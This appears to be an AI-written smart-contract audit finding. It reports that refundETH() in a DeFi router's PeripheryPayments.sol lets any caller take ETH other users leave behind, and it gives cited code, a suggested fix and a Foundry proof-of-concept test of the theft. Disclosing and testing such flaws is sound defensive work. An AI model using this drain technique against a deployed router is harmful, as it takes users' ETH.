The vulnerability claim is valid. Here is the full analysis:

---

### Title
`refundETH()` Has No Access Control — Any Caller Can Drain ETH Left on the Router by Other Users - (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender`. Because ETH can accumulate on the router between transactions (via excess `msg.value` from payable swap calls that is not fully consumed), any third party can call `refundETH()` in a subsequent transaction and steal that ETH.

### Finding Description

`refundETH()` is implemented as:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
``` [1](#0-0) 

There is no check that `msg.sender` is the original ETH depositor, no per-user accounting, and no restriction on who may call it.

ETH accumulates on the router via the `pay()` internal function. When `token == WETH` and the contract's native balance covers the required amount, it deposits exactly `value` wei into WETH and leaves the remainder as raw ETH on the contract:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        ...
    }
``` [2](#0-1) 

All four swap entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) are `payable` and call `pay()` internally. [3](#0-2) 

The `receive()` fallback blocks arbitrary direct ETH sends (only WETH may send ETH that way), but it does **not** block ETH sent via `payable` function calls. [4](#0-3) 

The intended safe pattern is `multicall([swap(...), refundETH()])` in one transaction. The `multicall` implementation uses `delegatecall` and is atomic: [5](#0-4) 

However, if a user calls a swap function directly (not via multicall), or omits `refundETH()` from their multicall, the excess ETH persists on the router after the transaction ends. A subsequent caller can then drain it with a standalone `refundETH()` call.

### Impact Explanation

Direct loss of user principal (native ETH). The attacker receives ETH that belongs to the original sender. No privileged role is required — the attacker only needs to monitor the router's ETH balance and call `refundETH()`.

### Likelihood Explanation

Users swapping with WETH as input commonly send a rounded-up `msg.value` and rely on `refundETH()` to recover the excess. Any user who calls a swap function directly (without multicall) or who constructs a multicall without appending `refundETH()` leaves ETH on the router. This is a realistic and observable on-chain condition.

### Recommendation

Track per-sender ETH deposits in transient storage (EIP-1153) and only refund the recorded amount to the original sender, or restrict `refundETH()` so it can only be called as part of a `multicall` initiated by the same `msg.sender` who deposited the ETH.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;
import "forge-std/Test.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;

    function setUp() public {
        router = new MetricOmmSimpleRouter(address(weth), address(factory));
    }

    function test_attackerStealsExcessETH() public {
        address userA   = makeAddr("userA");
        address attacker = makeAddr("attacker");
        vm.deal(userA, 1 ether);

        // User A calls exactInputSingle with 1 ETH but swap only consumes 0.5 ETH.
        // User A does NOT append refundETH() — 0.5 ETH remains on the router.
        vm.prank(userA);
        router.exactInputSingle{value: 1 ether}(paramsFor0point5ETH);

        assertEq(address(router).balance, 0.5 ether);

        // Attacker calls refundETH() in a separate transaction.
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance, 0.5 ether);  // attacker stole userA's ETH
        assertEq(address(router).balance, 0);
    }
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-81)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
